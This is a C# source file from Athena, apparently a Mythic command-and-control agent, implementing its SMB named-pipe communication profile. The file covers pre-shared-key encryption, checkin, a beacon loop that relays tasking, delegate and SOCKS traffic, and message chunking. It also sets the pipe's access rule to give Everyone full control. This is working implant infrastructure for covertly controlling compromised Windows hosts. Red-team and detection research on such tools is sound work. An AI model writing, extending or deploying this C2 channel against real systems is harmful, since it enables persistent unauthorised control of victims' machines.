using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System.Collections.Concurrent;

using H.Pipes;
using H.Pipes.Args;
using H.Pipes.AccessControl;

using System.Diagnostics;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.Json;


namespace Athena
{
    public class Smb : IProfile
    {
        public string uuid { get; set; }
        public string psk { get; set; }
        public string pipeName = "pipename";
        private string checkinResponse { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        private bool connected { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("false");
        private PipeServer<DelegateMessage> serverPipe { get; set; }
        public PSKCrypto crypt { get; set; }
        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        private CancellationTokenSource cts = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        private ManualResetEvent onCheckinResponse = new ManualResetEvent(false);
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();

        public Smb()
        {
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            uuid = "%UUID%";
            this.connected = false;
            this.psk = "AESPSK";
            this.sleep = 0;
            this.jitter = 0; ;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }
            this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }

            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
            this.serverPipe.StartAsync();

            Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
        }
        public async Task StartBeacon()
        {

            while (!cts.IsCancellationRequested)
            {
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask);

                List<string> responses = responseTask.Result;
                List<DelegateMessage> delegateMessages = delegateTask.Result;
                List<SocksMessage> socksMessages = socksTask.Result;

                if (responses.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0)
                {
                    GetTasking gt = new GetTasking()
                    {
                        action = "get_tasking",
                        tasking_size = -1,
                        delegates = delegateMessages,
                        socks = socksMessages,
                        responses = responses,
                    };

                    //Just send the stuff, I don't really currently know how to error check sends.
                    await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
                }
            }
        }
        private async void OnMythicMessageReceived(string message)
        {
            //We have a full message from the Pipe.
            if (this.encrypted)
            {
                //Decrypt if necessary
                message = this.crypt.Decrypt(message);
            }
            else
            {
                message = (await Misc.Base64Decode(message)).Substring(36);
            }

            //Check what kind of message we got.
            Dictionary<string, string> msg = Misc.ConvertJsonStringToDict(message);

            //Check if it's a checkin or not
            if (msg.ContainsKey("action") && msg["action"] == "checkin")
            {
                //We got our checkin response
                this.checkinResponse = message;
                this.onCheckinResponse.Set();

            }
            else
            {
                //We got a task response
                GetTaskingResponse gtr = JsonSerializer.Deserialize(message, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr == null)
                {
                    return;
                }

                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                this.SetTaskingReceived(this, tra);
            }
        }
        public bool StopBeacon()
        {
            cts.Cancel();
            return true;
        }
        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe
            await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for our ManualResetEvent to trigger indicating we got a response.
            onCheckinResponse.WaitOne();

            //We got a message, but we should make sure it's not empty.
            if (!string.IsNullOrEmpty(this.checkinResponse))
            {
                string res = this.checkinResponse;
                this.checkinResponse = String.Empty;

                return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
            }

            return new CheckinResponse()
            {
                status = "failed"
            };
        }
        private async Task OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
        {
            //Event handler for new messages
            try
            {
                Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.message.Length} bytes");
                //Check if we already have a partial message
                if (this.partialMessages.ContainsKey(args.Message.uuid))
                {
                    //This message already exists in our dictionary, check to see if it's final.
                    if (args.Message.final) //Final message received
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Final message received.");
                        string oldMsg = args.Message.message;

                        //Append the final message to our object
                        args.Message.message = this.partialMessages[args.Message.uuid].Append(oldMsg).ToString();

                        //Signal to our subscribers that a message is available.
                        this.OnMythicMessageReceived(args.Message.message);

                        //Remove the partial message from our tracker since we're done with it.
                        this.partialMessages.Remove(args.Message.uuid, out _);
                    }
                    else //Not Last Message but we already have a value in the partial messages
                    {
                        //Append our message to the current one
                        this.partialMessages[args.Message.uuid].Append(args.Message.message);
                    }
                }
                else //First time we've seen this message
                {
                    if (args.Message.final) //Message was small enough for one write
                    {
                        this.OnMythicMessageReceived(args.Message.message);
                        onEventHappenedSignal.Set(); //Indicate something happened
                    }
                    else //Message needs to be added to our tracker
                    {
                        Debug.WriteLine($"[{DateTime.Now}] New message received, adding to tracker.");
                        this.partialMessages.GetOrAdd(args.Message.uuid, new StringBuilder(args.Message.message)); //Add value to our Collection
                    }
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] {e}");
            }
        }
        private async Task OnClientConnection()
        {
            Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
            onClientConnectedSignal.Set();
            this.connected = true;
        }
        private async Task OnClientDisconnect()
        {
            Debug.WriteLine($"[{DateTime.Now}] Client Disconnected.");
            this.connected = false;
            onEventHappenedSignal.Set(); //Indicate something happened
            onClientConnectedSignal.Reset();
            this.partialMessages.Clear();
        }
        private async Task<string> Send(string json)
        {
            if (!connected)
            {
                onClientConnectedSignal.WaitOne();
            }

            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                DelegateMessage dm = new DelegateMessage()
                {
                    uuid = this.uuid,
                    c2_profile = "smb",
                    final = false
                };

                IEnumerable<string> parts = json.SplitByLength(4000);

                //hunk the message and send the parts
                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {json.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes.");
                    dm.message = part;

                    if (part == parts.Last())
                    {
                        dm.final = true;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {dm.final}");
                    await this.serverPipe.WriteAsync(dm);
                }

                Debug.WriteLine($"[{DateTime.Now}] Done writing message to pipe.");

            }
            catch (Exception e)
            {
                this.connected = false;
            }

            return String.Empty;
        }
    }
    class SmbMessage
    {
        public string uuid;
        public string message;
        public int chunks;
        public int chunk;
    }
}
